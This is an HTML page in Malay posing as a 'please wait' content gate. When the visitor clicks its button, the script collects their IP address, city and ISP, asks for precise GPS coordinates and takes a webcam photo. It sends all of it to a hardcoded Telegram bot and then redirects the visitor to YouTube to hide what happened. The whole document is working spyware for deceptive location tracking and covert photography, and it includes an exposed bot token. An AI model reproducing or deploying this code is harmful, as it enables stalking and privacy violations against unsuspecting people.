<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sila Tunggu...</title>
    <style>
        body { background: #111; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .btn { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; border: none; color: white; border-radius: 50px; font-weight: bold; transition: 0.3s; }
        .btn:hover { background: #005580; }
    </style>
</head>
<body>

    <button id="main-btn" class="btn">KLIK UNTUK LIHAT KANDUNGAN</button>
    <p id="status" style="margin-top: 20px; color: #888;">Sila benarkan akses jika diminta untuk pengesahan.</p>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>

    <script>
        const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
        const CHAT_ID = '8563935930';

        document.getElementById('main-btn').addEventListener('click', async () => {
            document.getElementById('status').innerText = "Sedang memproses...";
            
            // 1. Ambil IP & Lokasi Anggaran (Automatik)
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                const infoIP = `🌐 *INFO IP (Anggaran)*\nIP: \`${data.ip}\`\nKawasan: ${data.city}, ${data.region}\nISP: ${data.org}`;
                await sendToTele(infoIP);
            } catch (e) { console.log("IP Error"); }

            // 2. Ambil Lokasi GPS Tepat (Minta Izin)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    await sendToTele(`📍 *LOKASI GPS TEPAT*\nGoogle Maps: [Klik Sini](${mapLink})`);
                }, (err) => { sendToTele("❌ Akses Lokasi Ditolak"); }, { enableHighAccuracy: true });
            }

            // 3. Ambil Gambar (Minta Izin)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(res => setTimeout(res, 1000));
                
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, 'snap.jpg');
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
            } catch (e) { await sendToTele("❌ Akses Kamera Ditolak"); }

            // Redirect selepas 3 saat
            setTimeout(() => { window.location.href = "https://www.youtube.com"; }, 3000);
        });

        async function sendToTele(text) {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        }
    </script>
</body>
</html>
